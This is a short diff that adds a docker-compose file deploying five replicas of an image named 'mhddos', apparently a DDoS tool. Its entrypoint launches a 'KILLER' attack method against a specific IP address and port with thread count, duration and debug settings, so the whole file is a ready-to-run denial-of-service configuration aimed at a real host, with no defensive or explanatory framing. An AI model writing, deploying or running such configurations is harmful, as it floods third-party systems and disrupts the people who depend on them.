@@ -1,0 +1,11 @@
+version: "3.9"
+services:
+  mhddos:
+    image: mhddos
+    deploy:
+      replicas: 5 
+
+
+    volumes:
+      - ./files:/app/files
+    entrypoint: ["python3", "/app/start.py","KILLER","https://34.88.165.209:64297","5"," 100"," /app/files/none.txt", "300", "600", "debug"]
